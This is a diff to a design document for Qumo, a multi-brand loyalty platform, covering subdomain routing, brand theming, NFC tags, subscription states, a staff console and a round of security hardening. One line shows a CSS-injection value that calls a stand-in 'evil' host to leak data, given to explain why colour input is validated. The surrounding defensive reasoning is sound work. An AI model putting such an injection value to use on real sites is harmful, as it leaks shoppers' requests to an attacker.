@@ -95,6 +95,9 @@ them different jobs: **poster = join and opt in; slip or sticker = earn.**
 captured and versioned; there is no path to withdraw it.
 
 **g) No brand analytics.** Nothing shows a brand how a campaign is performing.
+*Partly addressed in Phase E:* the console overview now carries members,
+scans, active promotions, unsigned-store exposure, and the outstanding
+liability. Per-campaign and per-store performance over time is still missing.
 
 **h) No subscription anything.** No tier, no status, no cancellation
 behaviour.
@@ -138,14 +141,71 @@ lawful basis before it is ever built.
 
 ### Routing: subdomain per brand
 
-`{slug}.qumo.app`. One deployment, wildcard certificate, theme resolved from
-the `Host` header in middleware. Cookies scope naturally per subdomain, which
-means a session on one brand's site does not automatically carry to another —
+*Built in Phase D.*
+
+`{slug}.{root}`. One deployment, wildcard certificate, theme resolved from the
+`Host` header in the proxy. Cookies scope naturally per subdomain, which means
+a session on one brand's site does not automatically carry to another —
 correct isolation, and the "one tap to opt in" recognition happens by phone at
-sign-in rather than by a shared cookie.
+sign-in rather than by a shared cookie. That is visible rather than theoretical:
+sign in at `chicken-licken.…`, open `campari.…` in the same browser, and you
+get a login page.
+
+The apex is deliberately not a brand. Nor is `www`, nor any of a reserved list
+(`app`, `admin`, `api`, `console`, …) that the brand console and the API will
+want later — enforced at resolution rather than only at sign-up, so a row
+written straight into the database still cannot claim one. A host that names no
+brand is *rewritten* to `/no-brand`, which keeps the typed address in the bar
+and, more importantly, means no page component runs without a brand.
+
+**The root domain is configuration, not a constant** —
+`NEXT_PUBLIC_QUMO_ROOT_DOMAIN`, read at build time because the proxy is
+compiled into the Edge runtime. It defaults to `localhost`, which makes
+`chicken-licken.localhost:3000` a working local brand host with no hosts-file
+editing, and it means the still-open `qumo.app` / `qumo.co.za` question does
+not block anything.
+
+**How the brand reaches the Node side.** The proxy resolves the slug from the
+`Host` header and sets `x-qumo-brand`, having *deleted* any incoming copy
+first. That delete is the whole defence, not a belt-and-braces addition: a
+header is the one part of a request a client fully controls, so a proxy that
+merely added the header would let `X-Qumo-Brand: some-other-brand` select a
+brand directly. Hostname parsing happens in exactly one place; the Node side
+reads the header and never re-parses.
+
+**What a brand actually gets to change.** Display name, tagline, logo, support
+contact, and one accent colour with its ink. The accent overrides exactly two
+CSS custom properties — the primary button and its text — because the shopper
+stylesheet was already written against tokens. A brand owns the element that
+says what happens next; it does not get to recolour type, ground or rules, so
+it cannot make its own programme unreadable.
+
+Colours are *matched* against `^#[0-9a-fA-F]{6}$`, not sanitised. The value
+lands in a `style` attribute, and a CSS value is not text: `red;background:
+url(https://evil/?c=` is a request off every shopper's phone. Logos must be
+absolute `https` for the same reason plus a duller one — an `http` logo is a
+mixed-content block that presents as a brand with no logo and nobody knowing
+why. Invalid values degrade to absent, so a brand that pastes a malformed
+colour gets the default black button rather than a broken page.
+
+**Cross-brand scans are refused, and the refusal costs nothing.** A slip or
+pack code opened on the wrong brand's host is rejected before anything is
+awarded or burned, so the shopper can still use it at the right address. This
+never protected the money — the award has always been driven by the code's own
+`brandId` — but it makes "a page under brand X shows only brand X" true rather
+than nearly true, and a shopper cannot tell those two apart by looking. The
+check is a parameter on the engine call rather than a rule in the page, because
+not every carrier asserts a brand: an SMS arrives with a code and a phone
+number and no host at all, and the absence of a claim is not a mismatched one.
 
 Custom domains (`rewards.chickenlicken.co.za`) become a later upsell without
 changing the model.
+
+**One thing deliberately not narrowed.** The data export still spans every
+brand the shopper has joined, on every brand's site. It is generated for the
+signed-in shopper and sent to them; narrowing it to the host would answer a
+different question than a subject access request asks. The screen says so in
+as many words.
 
 ### Two code types, two jobs
 
@@ -159,7 +219,124 @@ changing the model.
 This is the distinction that makes the poster safe. A poster that awards value
 is a poster that awards value to everyone who walks past it.
 
+### Carriers: NFC taps alongside QR codes, never instead of them
+
+An NFC tag holding an NDEF URI record is a URL carrier. Tap it and the phone
+opens a URL — the engine cannot tell whether that URL arrived through a
+camera or a radio, and should not care. So NFC is a *carrier* decision, not
+an architectural one, and it splits into two very different tiers.
+
+**Tier one needs no code at all.** Encode `https://qumo.co.za/s/K7M2-P9QR-3XVW`
+onto a tag and it works today: same route, same single-use guarantee, same
+ledger. A pack code is twelve characters from a 31-symbol alphabet, so the
+whole URL sits comfortably under 60 bytes — fine even on the cheapest NTAG213
+with 144 bytes of user memory. For a sticker on a box this is a packaging
+choice and nothing else.
+
+**Tier two changes what a poster can do**, which is the part worth the money.
+
+The rule elsewhere in this document is that a poster proves nothing: it is
+one static code, anyone walking past can scan it, so a poster can only be a
+join-and-opt-in door. A secure tag breaks that. NTAG 424 DNA chips do "SUN"
+— the chip computes a fresh CMAC on every single tap and appends it, along
+with a counter that only ever increments, so the URL is different each time:
+
+    /t?e=<encrypted uid + counter>&c=<cmac>
+
+That buys two things a printed code fundamentally cannot:
+
+- **Proof the physical tag was tapped.** A copied URL carries a stale
+  counter and is refused, so it cannot be photographed, screenshotted or
+  forwarded into a group chat.
+- **Replay protection from the hardware**, rather than from a constraint we
+  maintain.
+
+So a table-talker at the till *can* honestly award a visit stamp, because
+tapping proves presence. It still does not prove **purchase** — someone
+standing near the counter taps without buying — so percent-of-spend stays on
+the slip. But for "buy 10, get the 10th free", a tap the cashier watches is
+good enough, and it is a far better moment than typing a code.
+
+#### What each carrier actually proves
+
+| Carrier | Proves presence | Proves purchase | May earn |
+|---|---|---|---|
+| Poster QR, or a plain tag | No | No | Join and opt in only |
+| Pack code (printed or on a tag) | No | Weakly — they hold the pack | Yes, once per code |
+| Till slip QR, signed | Yes | **Yes**, with the basket value | Yes, percent of spend |
+| Secure NFC tap (SUN) | **Yes** | No | Yes, a visit stamp |
+| SMS with a slip code | No | Yes, via the slip | Yes |
+
+#### The rule that goes on every printed thing
+
+**NFC is always additive. Every tag gets a QR beside it.**
+
+iPhone XS and later read tags in the background with no app, but only with
+the screen on and unlocked; older iPhones need the Control Centre widget;
+plenty of people have NFC switched off entirely. For Chicken Licken's
+customer base "my phone doesn't do that" is a common outcome, not an edge
+case, and a shopper who cannot tap must never be stuck.
+
+#### The operational risk that has no software fix
+
+**A blank tag is rewritable by anyone with a phone.** Somebody walks into a
+store, rewrites the table-talker to point at a phishing page, and the
+brand's own shoppers get harvested. Production tags must have their lock
+bits permanently set after encoding. That is a step in whoever does the
+encoding and a line in what the console tells them — it cannot be enforced
+from here, which is exactly why it needs writing down.
+
+#### Implementation, when it lands
+
+An `NfcTag` model holding the chip UID and its two AES keys encrypted, a
+`/t` route that decrypts and verifies the CMAC, and a monotonic counter
+check done as a compare-and-swap inside the same serializable transaction
+everything else uses. The same shape as receipt signing, with the secret
+living in silicon instead of a POS template.
+
 ### Subscription lifecycle
+
+*Built in Phase F.* This models the lifecycle, not the billing — no payment
+provider is integrated, so nothing here takes money. It records what state a
+brand is in, and the engine enforces the consequences. When billing lands it
+drives these transitions rather than replacing them.
+
+**The state is derived, never trusted from a flag.** A cancelled programme
+closes when its window elapses whether or not anything ran to notice.
+`closeElapsedProgrammes()` exists and is tidying — if it never runs, the
+answer is still right, because it is computed from the date. Built the other
+way round, a brand stops paying, a nightly job quietly fails, and the
+programme keeps awarding for a month.
+
+**Enforced in three places, for three different reasons.** Both scan paths
+refuse *before* burning anything, so a closed programme never costs a shopper
+a single-use code — if the brand comes back, the sticker still works.
+`applyAccrual` refuses as a backstop, inside the transaction, so a caller
+added later (an SMS adapter, an import) cannot accrue by forgetting to ask.
+And `createWalletSpend` refuses once the window closes, so a shopper is told
+before they ask a cashier to honour something that will be declined.
+
+**The window is stored, not recomputed.** `honourRedemptionUntil` is written
+once at cancellation. If the policy ever becomes thirty days, everybody
+already cancelled under sixty keeps sixty — the same reasoning as versioning
+consent copy: what somebody was promised does not change because the promise
+later did.
+
+**A brand with no subscription row fails open**, deliberately, and the
+console says so ("Not on a plan yet. Billing isn't connected yet"). While
+brands are onboarded by hand, an absent row means "not on the billing system"
+rather than "stopped paying", and failing closed would let a missed row kill
+a live programme. `lib/subscriptions/state.ts` marks this as the direction to
+reverse once billing exists.
+
+**Both sides see it.** The shopper's wallet leads with the closure and the
+date rather than showing a balance that will quietly stop working; the join
+page stops inviting people into a programme that has ended; and the join
+page states the sixty-day rule up front, which is where the plan asked for
+it. Deliberately *not* added to the versioned consent copy — that would be a
+`WEB_CONSENT_VERSION` bump, and the operator decision is still open, so it
+wants doing once rather than twice.
+
 
 `Subscription` on the brand: status, period end, cancelled-at. On cancellation:
 **earning freezes immediately, redemption is honoured for 60 days**, then the
@@ -223,6 +400,48 @@ than a rebuild. Excluded for now because Qumo is staying clear of CIOS.
 
 ---
 
+### One Next.js trap worth writing down
+
+`redirect()` inside a server action is resolved against the dev server's own
+origin rather than the host the request arrived on. On a single-domain app
+that difference never shows. Here it silently moved a shopper from
+`chicken-licken.…` to the apex, where there is no brand, and rendered "this
+link needs a brand" under a perfectly correct URL.
+
+Making the redirect absolute did not fix it — the `Location` was right and the
+router's data fetch still went to the wrong origin. **So server actions on the
+shopper surface return an outcome and the client navigates**, which is the
+shape the login form always used. Any new action that needs to send a shopper
+somewhere must do the same.
+
+This shipped broken in Phase D: sign-out landed a shopper on the no-brand
+page. The test asserted the session row was revoked — which it was — and never
+looked at the resulting screen. Worth remembering as the class of bug that
+survives a green suite.
+
+Local development also needs `allowedDevOrigins` in `next.config.ts`, because
+every brand subdomain is a separate origin from the apex the dev server binds
+to.
+
+The `/r` double-render described above had an unfixed twin on `/s`. A pack
+code scanned after signing in rendered twice, awarded on the first and told
+the shopper "this code has already been used" on the second — the render they
+actually see. Fixed the same way: `PackCode` records what the scan awarded,
+and a repeat by the same shopper is a receipt rather than a refusal. A repeat
+by *anyone else* — a label photographed and shared — is still refused.
+
+A third, from the promotions editor and not Next-specific: `defaultValue` on
+an uncontrolled input applies at mount and never again. After saving a stamp
+rule the card read "1 stamp" while the form beneath it still read "share of
+spend, in rands" — and pressing save again would have quietly replaced the
+stamp card with 5% cashback. Forms whose defaults come from saved data are
+keyed on that data so they remount when it changes.
+
+A second trap in the same family: a `"use server"` file may only export async
+functions. Exporting a constant from one — an idle state for `useActionState`,
+say — passes `tsc` and `eslint` and then throws in the browser at render time.
+Shared state shapes live in their own module beside the actions.
+
 ## 5. Security work that must land regardless
 
 Found during the review, unchanged by any of the above.
@@ -236,11 +455,136 @@ Found during the review, unchanged by any of the above.
    by neither Qumo scan path.
 2. **No liability ceiling on issued value.** `Reward.maxCoupons` caps coupons;
    nothing caps cents or points. A brand running 5% cashback has unbounded
-   exposure and no answer for their finance director.
+   exposure and no answer for their finance director. *Both halves now exist:*
+   Phase B added the ceilings on `EarnRule`, and Phase E put the outstanding
+   figure on the console overview — summed from the ledger, so a redemption
+   nets it down the moment it happens and it can never drift from the rows
+   behind it.
 3. **Rate limiting is per-process** (`lib/security/rate-limit.ts`, in-memory).
-   On serverless the effective limit is limit × instances. Needs a shared store.
+   On serverless the effective limit is limit × instances. Needs a shared
+   store. *Fixed.* The counters moved to Postgres — one row per key, one
+   atomic `INSERT ... ON CONFLICT` per check, so concurrent callers queue
+   rather than interleave and the limit means the number it says. Postgres
+   rather than Redis because the volume is login attempts and scans, not
+   millions of events, and a database we already run beats a second vendor
+   and a second set of credentials to leak; the interface is one function,
+   so moving to Redis later is one file. The per-client login cap moved out
+   of the Edge proxy at the same time — the Edge runtime is precisely where
+   a shared counter cannot be read — into `lib/security/login-guard.ts`,
+   called from the login actions. Proven by restoring the old limiter and
+   watching the multi-instance test admit six attempts against a limit of
+   three.
 4. **The privacy notice promises data access, correction and deletion. None of
    it is implemented.** Same family as the missing opt-out.
+5. **No Content-Security-Policy, and no HSTS.** *Both now exist.* The policy
+   is built per request in `lib/security/csp.ts` and set from `proxy.ts`,
+   with a per-request nonce that Next stamps onto its own script tags. It
+   is the strict form rather than the usual `'unsafe-inline'` compromise,
+   which was affordable only because there is no inline script anywhere in
+   `app/` and `next/font` self-hosts every typeface at build time — brand
+   type selection included, which is exactly why it is a list rather than a
+   text box. Two places stay
+   loose and are documented where they are set: `style-src` allows inline
+   because brand theming colours elements through the `style` attribute,
+   and `img-src` allows any https host because a brand's logo lives on that
+   brand's CDN — which also means the brand's host sees every shopper who
+   loads the page, and proxying logos through our own origin would close
+   both at once. HSTS is two years with `includeSubDomains` (the shopper
+   surface *is* subdomains) and deliberately without `preload`, which is
+   close to irreversible and premature before the domain is registered.
+7. **No record of what a brand's staff did.** *Fixed.* `AuditEvent` records
+   every console write — promotions created and switched on, ceilings
+   moved, store secrets rotated and signing disabled, team invited,
+   demoted, deactivated and reset, identity changed, programme cancelled
+   and resumed. The write is part of the action rather than a side effect:
+   `record()` throws if it cannot write, which is the deliberate opposite
+   of the error reporter, because a privileged action that completed with
+   no record of who did it is worse than one that failed and can be
+   retried.
+
+   Append-only, and enforced rather than intended: `lib/db/tenant.ts`
+   refuses update, upsert and delete on the model outright. The actor is
+   stored as a plain id with the name and email copied in, deliberately
+   *not* a foreign key — every delete rule available would rewrite or
+   remove rows here when a User is deleted, which is exactly what
+   append-only exists to prevent, and a log answers "who did this" with who
+   they were at the time rather than who the row points at today.
+8. **No second factor for staff.** *Fixed.* TOTP, not SMS: SMS costs money
+   per login, needs an aggregator account that does not exist yet, and SIM
+   swap is a live attack in this market. Written out rather than installed
+   — forty specified lines, and a dependency in the authentication path is
+   a supply chain in the authentication path — and verified against the
+   published RFC 6238 test vectors rather than against itself.
+
+   Ten single-use recovery codes, because every other part of this system
+   refuses to let a brand lock itself out and a second factor without them
+   reintroduces exactly that. Using one revokes every other session, since
+   it means a phone was lost or somebody else has the codes. Codes are
+   single-use within their own window too: `totpLastStep` is recorded and
+   anything at or below it refused, which closes the ninety seconds an
+   overshoulder-read code would otherwise stay usable for.
+
+   There is deliberately no "reset someone else's MFA" — an owner who could
+   clear a colleague's second factor could also take their account.
+9. **Nothing ran the checks automatically.** *Fixed.* CI runs lint,
+   typecheck, tests and build on every push and pull request against a real
+   Postgres service container. Running it proved something the suite had
+   never been asked: all tests pass on an empty database, so none had come
+   to depend on a developer's seeded data.
+
+### What the adversarial pass found
+
+Run over the finished branch rather than each change, so it read the state
+that ships. Three findings, all fixed, and the first was serious.
+
+**No cap on second-factor guesses.** The only limit on guessing a TOTP was
+the per-client login cap — which is keyed on the caller's address precisely
+so it catches one machine working through many accounts, and does nothing
+about many machines working on one. That is the shape of an attack on a
+second factor, because whoever is guessing already has the password. A
+six-digit code across a three-step window is roughly a 3-in-a-million guess,
+so an attacker with rotating addresses expects to be through inside a day at
+ten requests a second. The feature was decorative. Now capped per account,
+which is the same two-limits-keyed-differently shape the shopper passcode
+already used, and proved by removing the fix and watching the correct code
+be accepted after ten wrong ones.
+
+**The print-run download had no role check.** It checked that somebody was
+signed in and that the batch was theirs, but not their role — while creating
+a batch requires OWNER, ADMIN or MARKETING. QUALITY, the one role
+deliberately barred from making codes, could download every code in every
+batch. The comment justifying it was the error: "codes are not secret — they
+end up printed on the outside of a box." True of a printed code, which costs
+a purchase to obtain; not true of the file, which is every unredeemed code
+at once.
+
+**The cron secret was compared with `!==`.** String comparison stops at the
+first differing byte. Hard to exploit over a network and free to avoid — and
+the inconsistency was the real finding, since every other secret comparison
+in the repo already uses `timingSafeEqual`.
+
+Checked and found sound: only one code path mints a staff session and it is
+behind the second factor; every console action gates on a verified session
+and re-checks the role in the engine; no manage function takes an id it does
+not scope; the join and wallet paths read no id from the request at all.
+6. **Nothing tells us when production breaks.** *Fixed.* `instrumentation.ts`
+   wires Next's `onRequestError` into `lib/observability/report.ts`, so
+   every server throw — page, action or route handler, caught or not —
+   produces a structured line on stdout, which Vercel indexes with no
+   account needed. `ERROR_WEBHOOK_URL` adds a Slack-shaped POST per
+   distinct failure per five minutes. The throttle counts in process
+   memory, and the reasoning is deliberately the *opposite* of the rate
+   limiter's: an error reporter is most needed when the database is
+   unreachable, so it must not need one. Proven by stopping Postgres and
+   watching the report arrive anyway.
+
+   CSP violations post to `/api/csp-report`, which defends itself as an
+   unauthenticated public endpoint should — shared rate limit, size cap,
+   known fields only, 204 to everything. One finding worth keeping: sending
+   both `report-uri` and `report-to` delivers **nothing**, because Chrome
+   ignores the former when the latter is present and the `report-to` path
+   then fails silently. `report-uri` alone, verified end to end against a
+   real browser over TLS.
 
 ---
 
@@ -260,18 +604,126 @@ and shares every fix below:
 **Phase C — extraction.** New repo, new database, copy the engine, drop the
 CIOS-specific models. Nothing shared at runtime.
 
-**Phase D — brand identity layer.** `Brand.slug` as subdomain, theme fields,
-host-based resolution in middleware, invert the shopper shell so the brand is
-the identity and Qumo is the footer.
+**Phase D — brand identity layer. Done.** `Brand.slug` as subdomain, theme
+fields, host-based resolution in the proxy, and the shopper shell inverted so
+the brand is the identity and Qumo is a footer line. Details above under
+*Routing*. Proven by driving two brands in a browser, in both colour schemes,
+plus 22 tests across host parsing, colour injection, header spoofing and
+cross-brand scans.
 
-**Phase E — brand console.** Own app, own auth, own nav. Promotions, stores,
-poster and sticker codes, analytics, billing.
+**Phase E — brand console. Auth and first screens done; management screens
+still to come.** Own app at `app.{root}`, own auth, own nav, own stylesheet.
+Built so far: staff login, an overview with the liability figure, the
+promotions screen with the poster URL to print, and full store management —
+adding tills, issuing and rotating signing secrets, and switching a store
+off. Promotions can now be created, given a rule, capped and switched on, and a
+brand can manage its own team. Pack codes can be generated and downloaded as
+CSV for a printer. Still to come: billing.
 
-**Phase F — subscription lifecycle**, with the freeze-and-honour rule.
+*A print run is only useful if it comes back out.* Generating a batch used to
+put rows in a table nothing could read, so a brand could order 50,000
+stickers and have no way to send them anywhere. The CSV carries the code, its
+readable form, the URL to turn into a QR, and whether it has been used — and
+the URL is on the brand's own host, because a code scanned at the apex lands
+on the no-brand page.
+
+*Pack codes and share-of-spend promotions do not mix,* and nothing said so
+until driving the screen turned it up. A spend rule zeroes `amount` because a
+share of a basket is meaningless without one; a pack code carries no basket.
+Codes printed against such a promotion scanned successfully, awarded zero,
+and were consumed doing it. Refused now at print time and again at scan time
+— the second because a brand can print flat-per-scan codes and later switch
+that campaign to a share of spend, and the scan-time refusal happens before
+the code is burned so switching back makes the stickers work again.
+
+*Onboarding without email.* There is no mail provider in this product, so an
+owner adds somebody and is handed a one-time password to pass on however they
+normally would. That is a credential two people know from the moment it
+exists, and the only thing that makes it acceptable is that it stops working
+the first time it is used: the account is flagged, and a nested route group
+shows it the change-password screen and nothing else until it is cleared.
+Typing another URL lands back on the same screen.
+
+*A brand cannot lock itself out.* Every path that could remove the last
+active owner — deactivating one, demoting one — refuses and says why. Without
+it a single mis-click leaves a console nobody can administer and no way back
+except reaching into the database by hand, which is not a support process to
+design on purpose.
+
+*Revocation is wired to the events that should trigger it.* Deactivating an
+account, resetting its password, and changing your own all end sessions, with
+the reason recorded. Changing your own spares the session doing it — the
+browser you just typed a new password into is not what a password change is
+meant to sign out.
+
+*The ceilings finally have a UI.* They are what the forgery suite exists to
+justify — the only bound on what an unsigned store can be made to pay out —
+and until now a seed script was the only thing that could set them. Each
+promotion also shows what it has issued against its budget, counting credits
+only: `maxTotalAmount` caps what may be *issued*, so a redemption does not
+buy back headroom, and the number a brand reads has to be the one the ceiling
+actually measures.
+
+*Activation carries the "one spend-based promotion at a time" check.*
+Setting the rule already refused when another campaign was live with one,
+which blocks the obvious sequence — but not this one: configure two while
+both are paused, then switch them on in turn. Two live percent-of-spend
+campaigns make a scanned slip worth whichever row the database returns
+first. The gap was found while building the screen, closed at activation,
+and the test was confirmed to fail without the fix.
+
+*Signing secrets are shown once and never again.* Only the ciphertext is
+stored, so losing one means issuing another rather than recovering it — the
+same discipline as any other credential. Rotation asks for confirmation
+first and says what it costs: slips already printed at that till stop
+verifying the moment it lands, so a shopper with a receipt in their pocket
+would be told it could not be verified. A test asserts exactly that, because
+the warning is only worth printing if it is true.
+
+*Role checks live in the engine, not the screen.* The console hides controls
+a MARKETING user cannot use, and every action re-checks server-side. Hiding a
+button is courtesy; `requireRole` is the access control.
+
+*Two principals, one deployment.* The proxy decides which surface a request
+is for by hostname before it asks anything about sessions, and the split runs
+both ways — a brand host cannot reach a console route and a console host
+cannot reach a shopper route. Staff sessions are their own table and their
+own cookie, never a nullable column on the shopper's: one sessions table
+serving both principals means one row shape where `personId` and `userId` are
+both nullable, and a single missing condition turns a customer into an
+administrator. Tests assert that a shopper token does not resolve as staff
+and a staff token does not resolve as a shopper.
+
+*The console never reads a brand from its hostname.* A staff member's brand
+comes from their user row, read on every request. A console that took its
+tenant from the address bar would let staff of one brand reach another's data
+by editing it.
+
+*Session lifetime is twelve hours, against the shopper's thirty days.* A
+shopper's session unlocks their own balance on their own phone; a staff
+session unlocks a brand's stores, campaigns and signing secrets from whatever
+machine is at the desk. Resolution joins onto the user, so deactivating an
+account ends its sessions on the next request rather than at their expiry —
+"I've removed their access" has to be true when it is said.
+
+*Passwords use scrypt from `node:crypto`* — no bcrypt, no argon2, no native
+module to compile on every deploy target. Parameters are recorded in the
+stored string so they can be raised later without locking anyone out. Login
+hashes against a decoy when the address is unknown, so a wrong email and a
+wrong password cost the same time and neither is an oracle for the other.
+
+**Phase F — subscription lifecycle. Done.** Freeze earning at cancellation,
+honour redemption for sixty days, then close. Details above under
+*Subscription lifecycle*.
 
 **Phase G — SMS channel.** Balance lookup and SMS-to-earn over an aggregator's
 short code, as a thin adapter over the same engine calls. USSD only if the
 pilot shows the demand.
+
+**Phase H — NFC.** Tier one is already supported and needs only saying out
+loud to whoever encodes the tags. Tier two waits on a decision about whether
+tap-to-earn-a-stamp is wanted, because NTAG 424 DNA costs several times an
+NTAG213 and brings a key-management story with it.
 
 Redemption stays parked until a real brand tells us what their counter can do.
 SSO is out of scope — phone+OTP is the lowest friction at a till, and social
@@ -288,15 +740,58 @@ asserting it in a unit test.
 ## Decided
 
 - **Identity** — shared `Person` keyed on phone, brand-scoped view.
-- **Routing** — subdomain per brand, `{slug}.qumo.app`.
+- **Routing** — subdomain per brand, `{slug}.{root}`. The root domain is
+  configuration (`NEXT_PUBLIC_QUMO_ROOT_DOMAIN`), not a constant, so the
+  unresolved apex does not block anything.
 - **Pilot** — Chicken Licken (slip) first, Campari (sticker) once it's right.
 - **Redemption** — parked.
 - **Cancellation** — freeze earning, honour redemption 60 days.
 - **SSO** — out for now, addable later without touching identity.
 - **Separation** — own repo *and* own database. Nothing shared with CIOS.
 - **No-data channel** — build it ourselves over a rented bearer; SMS first.
+- **NFC** — an additional way to scan, never a replacement. Plain tags work
+  today; secure tags are their own phase.
+- **Type** — a brand can set both faces: the one everything is read in and
+  the one every figure is set in. Qumo's own (Instrument Sans, Martian Mono)
+  is the default rather than a floor, because a house style that cannot be
+  turned off is a restriction wearing a default's clothes. Chosen from a
+  curated list loaded at build time from our own origin, not typed as a font
+  name or a URL — that is what keeps `font-src 'self'` as it is, and keeps a
+  shopper's browser from telling a font CDN which brand's page they are on.
+  A brand's own licensed typeface is a real ask and a different piece of
+  work: it needs file storage and an answer to the webfont licence question.
+- **Company name** — QUMO, lodged with CIPC as first preference under
+  tracking number **9464844441**, with QUMO-APP, QUMOLATE and QUMOS as the
+  fallbacks in that order. Names are tested in order; if none is approved the
+  company registers under its registration number and a new name can be
+  reserved for R50 afterwards. Nothing in the code depends on the outcome
+  except `OPERATOR_NAME` — see below.
 
 ## Open, and needing you
+
+- ~~**Which legal entity is the operator.**~~ **Decided: Qumo.**
+  `OPERATOR_NAME` names Qumo, the consent point that renders it was rewritten
+  to read properly now that the operator and the product share a name, and
+  `WEB_CONSENT_VERSION` moved to `web-v3` — anyone on an older version
+  re-affirms on their next sign-in. The same bump picked up the terms, which
+  the tick box now points at alongside the notice, so the versioned copy was
+  rewritten once rather than twice. One caveat stands: a name lodged with CIPC
+  is not yet a registered company, so if registration lands under one of the
+  fallbacks, `OPERATOR_NAME` and the consent version move together again.
+- **A company name is not a trademark.** CIPC approval puts QUMO on the
+  companies register; it grants no rights in the mark. The classes 35 and 42
+  search is still its own job, and worth asking an attorney whether 36 applies.
+- **The consent copy is the one place Qumo leads on a brand's page.** It now
+  reads "I agree to Qumo storing my mobile number and my activity with the
+  brands I scan, as described in the privacy notice and the terms" — still
+  true, and arguably more important to say plainly on a page that otherwise
+  belongs to the brand. Whether it should also *name* the brand being joined
+  still depends on the operator vs responsible party question below, and is
+  deliberately left for that decision rather than bumped a third time.
+
+- **Which moment is NFC for?** The pack case is free today. A poster at the
+  counter is where secure tags earn their cost. At the till the slip already
+  does the job better, because it knows the basket value.
 
 - **Operator vs responsible party** — still a legal question, now sharper: with
   brand-specific sites and per-brand opt-in, "the brand is responsible party,
